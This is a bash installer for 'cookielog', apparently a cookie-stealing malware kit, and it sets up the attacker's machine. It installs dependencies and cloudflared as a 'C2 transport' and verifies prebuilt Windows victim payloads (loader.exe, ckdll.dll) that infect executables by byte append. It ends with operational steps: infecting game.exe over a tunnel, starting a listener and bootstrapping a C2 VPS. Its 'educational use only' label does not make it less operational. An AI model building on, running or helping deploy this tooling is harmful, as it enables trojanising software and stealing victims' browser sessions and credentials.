#!/usr/bin/env bash
# ==============================================================================
# install.sh -- cookielog installer (Linux / macOS attacker box)
# EDUCATIONAL USE ONLY - FOR SECURITY RESEARCH AND TRAINING
#
# Installs everything the ATTACKER side needs on Linux/macOS:
#   1. python3 + pip + tkinter (system packages; tkinter is optional, GUI only)
#   2. pip packages from requirements.txt (cryptography, websocket-client)
#   3. CLI tools: fzf, bat, ripgrep -- via the system package manager
#   4. cloudflared -- the --tunnel C2 transport (no VPS, no port-forward)
#   5. Verify: project imports, prebuilt payload, loader slots
#
# The victim-side payload (bin/loader.exe, bin/ckdll.dll) is Windows-only and
# ships PREBUILT in bin/ -- infection is a byte append and needs no compiler
# here. There is no MSVC / build step on Linux by design.
#
# Usage:
#   ./install.sh              :: install everything
#   ./install.sh --no-tools   :: skip CLI tools (fzf, bat, ripgrep)
#   ./install.sh --no-tunnel  :: skip cloudflared
#   ./install.sh --no-build   :: accepted for parity with install.bat (no-op)
#   ./install.sh --check      :: report only, install nothing, exit 1 if broken
#
# Run from the cookielog directory.
# ==============================================================================
set -u
cd "$(dirname "$0")" || exit 1

DO_TOOLS=1
DO_TUNNEL=1
CHECK_ONLY=0
FAIL=0

for arg in "$@"; do
    case "$arg" in
        --no-tools)  DO_TOOLS=0 ;;
        --no-tunnel) DO_TUNNEL=0 ;;
        --no-build)  echo "[*] --no-build is a no-op on Linux (there is no build step)" ;;
        --check)     CHECK_ONLY=1; DO_TOOLS=0 ;;
        *) echo "[-] unknown option: $arg" ;;
    esac
done

echo "=============================================================================="
echo "  cookielog -- installer (Linux/macOS)"
echo "  EDUCATIONAL USE ONLY - FOR SECURITY RESEARCH AND TRAINING"
echo "=============================================================================="
echo

# --- detect package manager -------------------------------------------------
PKG=""
SUDO=""
if command -v apt-get >/dev/null 2>&1; then
    PKG="apt";     [ "$(id -u)" -ne 0 ] && SUDO="sudo"
elif command -v dnf >/dev/null 2>&1; then
    PKG="dnf";     [ "$(id -u)" -ne 0 ] && SUDO="sudo"
elif command -v pacman >/dev/null 2>&1; then
    PKG="pacman";  [ "$(id -u)" -ne 0 ] && SUDO="sudo"
elif command -v zypper >/dev/null 2>&1; then
    PKG="zypper";  [ "$(id -u)" -ne 0 ] && SUDO="sudo"
elif command -v brew >/dev/null 2>&1; then
    PKG="brew"
fi

# --- 1. python3 + pip + tkinter ---------------------------------------------
echo "[1/5] python3 + pip + tkinter..."
echo "=============================================================================="
if ! command -v python3 >/dev/null 2>&1; then
    if [ "$CHECK_ONLY" = "1" ]; then
        echo "    [-] python3 NOT installed"; FAIL=1
    elif [ -n "$PKG" ]; then
        echo "[*] installing python3 via $PKG..."
        case "$PKG" in
            apt)    $SUDO apt-get update && $SUDO apt-get install -y python3 python3-pip python3-venv ;;
            dnf)    $SUDO dnf install -y python3 python3-pip ;;
            pacman) $SUDO pacman -Sy --noconfirm python python-pip ;;
            zypper) $SUDO zypper install -y python3 python3-pip ;;
            brew)   brew install python3 ;;
        esac
        if command -v python3 >/dev/null 2>&1; then
            echo "    [+] python3 installed"
        else
            echo "    [-] python3 install failed"; exit 1
        fi
    else
        echo "    [-] python3 not found and no supported package manager (apt/dnf/pacman/zypper/brew)"
        echo "        install Python 3.8+ from https://python.org and re-run"
        exit 1
    fi
else
    echo "    [+] python3: $(python3 -V 2>&1)"
fi

PYBIN="$(command -v python3 || command -v python)"

if command -v python3 >/dev/null 2>&1; then
    if python3 -c "import tkinter" >/dev/null 2>&1; then
        echo "    [+] tkinter available (pick.py GUI works)"
    else
        echo "    [-] tkinter missing: pick.py GUI needs the system package"
        if [ "$CHECK_ONLY" = "0" ]; then
            case "$PKG" in
                apt)    $SUDO apt-get install -y python3-tk && echo "    [+] python3-tk installed" ;;
                dnf)    $SUDO dnf install -y python3-tkinter && echo "    [+] tkinter installed" ;;
                pacman) $SUDO pacman -Sy --noconfirm tk && echo "    [+] tk installed" ;;
                zypper) $SUDO zypper install -y python3-tk && echo "    [+] tkinter installed" ;;
                brew)   brew install python-tk && echo "    [+] python-tk installed" ;;
                *)      echo "    [*] install python3-tk manually if you want the GUI" ;;
            esac
        fi
    fi
fi

# pip module (python3-pip may still be missing if python3 came preinstalled)
if [ -n "$PYBIN" ] && ! "$PYBIN" -m pip --version >/dev/null 2>&1; then
    if [ "$CHECK_ONLY" = "0" ] && [ -n "$PKG" ]; then
        echo "[*] installing pip via $PKG..."
        case "$PKG" in
            apt)    $SUDO apt-get install -y python3-pip ;;
            dnf)    $SUDO dnf install -y python3-pip ;;
            pacman) $SUDO pacman -Sy --noconfirm python-pip ;;
            zypper) $SUDO zypper install -y python3-pip ;;
            brew)   brew install python3 ;;
        esac
    fi
fi

# --- 2. pip packages ---------------------------------------------------------
echo
echo "[2/5] pip packages (requirements.txt: cryptography, websocket-client)..."
echo "=============================================================================="
if [ -z "$PYBIN" ]; then
    echo "    [-] no python interpreter, skipping"
    FAIL=1
elif "$PYBIN" -c "import cryptography, websocket" >/dev/null 2>&1; then
    echo "    [+] already installed"
elif [ "$CHECK_ONLY" = "1" ]; then
    echo "    [-] NOT installed"; FAIL=1
else
    # PEP 668 (externally-managed environment, Debian 12+/Ubuntu 23+/Fedora):
    # --user alone fails, so fall back to --break-system-packages only when needed
    if ! "$PYBIN" -m pip install -r requirements.txt 2>/dev/null \
       && ! "$PYBIN" -m pip install --user -r requirements.txt 2>/dev/null \
       && ! "$PYBIN" -m pip install --break-system-packages -r requirements.txt; then
        echo "    [-] pip install failed. Alternatives:"
        echo "        $PYBIN -m venv venv && . venv/bin/activate && pip install -r requirements.txt"
        exit 1
    fi
    echo "    [+] pip packages installed"
fi

# --- 3. CLI tools ------------------------------------------------------------
echo
echo "[3/5] CLI tools (fzf, bat, ripgrep)..."
echo "=============================================================================="
if [ "$DO_TOOLS" = "1" ] && [ "$CHECK_ONLY" = "0" ] && [ -n "$PKG" ]; then
    case "$PKG" in
        apt)    $SUDO apt-get install -y fzf bat ripgrep ;;
        dnf)    $SUDO dnf install -y fzf bat ripgrep ;;
        pacman) $SUDO pacman -Sy --noconfirm fzf bat ripgrep ;;
        zypper) $SUDO zypper install -y fzf bat ripgrep ;;
        brew)   brew install fzf bat ripgrep ;;
    esac
fi
for t in "fzf" "bat" "rg"; do
    if command -v "$t" >/dev/null 2>&1; then
        echo "    [+] $t"
    else
        echo "    [-] $t not installed"
    fi
done

# --- 4. cloudflared ----------------------------------------------------------
echo
echo "[4/5] cloudflared (--tunnel C2 transport)..."
echo "=============================================================================="
CF_BIN="$(command -v cloudflared 2>/dev/null || true)"
[ -z "$CF_BIN" ] && [ -x "$HOME/.local/bin/cloudflared" ] && CF_BIN="$HOME/.local/bin/cloudflared"
if [ -n "$CF_BIN" ]; then
    echo "    [+] cloudflared: $CF_BIN ($("$CF_BIN" --version 2>&1 | head -n1))"
elif [ "$CHECK_ONLY" = "1" ]; then
    echo "    [-] cloudflared: not found (only --tunnel needs it)"
elif [ "$DO_TUNNEL" = "0" ]; then
    echo "    [*] skipping cloudflared (--no-tunnel)"
else
    case "$(uname -m)" in
        x86_64|amd64)  CF_ARCH="amd64" ;;
        aarch64|arm64) CF_ARCH="arm64" ;;
        *)             CF_ARCH="" ;;
    esac
    if [ -z "$CF_ARCH" ]; then
        echo "    [-] unsupported architecture: $(uname -m)"
        echo "        download cloudflared manually from github.com/cloudflare/cloudflared/releases"
    else
        mkdir -p "$HOME/.local/bin"
        CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-$CF_ARCH"
        echo "    [*] downloading cloudflared ($CF_ARCH)..."
        if command -v curl >/dev/null 2>&1; then
            curl -fsSL "$CF_URL" -o "$HOME/.local/bin/cloudflared"
        elif command -v wget >/dev/null 2>&1; then
            wget -q "$CF_URL" -O "$HOME/.local/bin/cloudflared"
        else
            echo "    [-] neither curl nor wget available"
        fi
        chmod +x "$HOME/.local/bin/cloudflared" 2>/dev/null || true
        if "$HOME/.local/bin/cloudflared" --version >/dev/null 2>&1; then
            CF_BIN="$HOME/.local/bin/cloudflared"
            echo "    [+] installed: $CF_BIN"
            case ":$PATH:" in
                *":$HOME/.local/bin:"*) ;;
                *) echo "    [!] $HOME/.local/bin is not in PATH -- add it so auto.py finds the binary" ;;
            esac
        else
            echo "    [-] cloudflared download failed"
        fi
    fi
fi

# --- 5. verify ---------------------------------------------------------------
echo
echo "[5/5] verify..."
echo "=============================================================================="
if [ -n "$PYBIN" ]; then
    if "$PYBIN" -c "import cryptography, websocket, auto, c2auth" >/dev/null 2>&1; then
        echo "    [+] project imports: ok (deps + auto + c2auth)"
    else
        echo "    [-] project imports failed -- run: $PYBIN -c 'import auto, c2auth'"
        FAIL=1
    fi
    if "$PYBIN" build.py verify >/dev/null 2>&1; then
        echo "    [+] build.py verify: ok (artifacts + loader slots)"
    else
        echo "    [-] build.py verify failed -- prebuilt bin/ is missing or unpatched"
        FAIL=1
    fi
else
    FAIL=1
fi

# --- summary -----------------------------------------------------------------
echo
echo "=============================================================================="
echo "  summary"
echo "=============================================================================="
if [ -n "$PYBIN" ]; then
    echo "  interpreter:  $PYBIN ($("$PYBIN" -V 2>&1))"
    "$PYBIN" -m pip --version >/dev/null 2>&1 && echo "  pip:          ok" || echo "  pip:          MISSING"
    "$PYBIN" -c "import cryptography, websocket" >/dev/null 2>&1 && echo "  pip packages: ok" || echo "  pip packages: MISSING"
else
    echo "  python3:      MISSING"
fi
[ -f bin/loader.exe ] && echo "  loader.exe:   prebuilt present" || echo "  loader.exe:   MISSING (copy bin/ from a Windows build machine)"
[ -f bin/ckdll.dll ]  && echo "  ckdll.dll:    prebuilt present" || echo "  ckdll.dll:    MISSING (copy bin/ from a Windows build machine)"
[ -n "${CF_BIN:-}" ]  && echo "  cloudflared:  ok" || echo "  cloudflared:  missing (only --tunnel needs it)"
echo
echo "Victim side (bin/) is Windows-only by design -- build there once, then"
echo "infect from Linux:  python3 auto.py game.exe --tunnel"
echo "Start the listener: python3 listen.py 9090"
echo "Build box (Windows):  python build.py all        # payload + keytool + verify"
echo "Listener VPS (TLS):   deploy/vps/bootstrap.sh c2.example.com"
echo
if [ "$CHECK_ONLY" = "1" ]; then
    if [ "$FAIL" = "1" ]; then
        echo "Done (check only) -- problems above."
        exit 1
    fi
    echo "Done (check only -- nothing was installed)."
fi
[ "$FAIL" = "1" ] && exit 1
exit 0
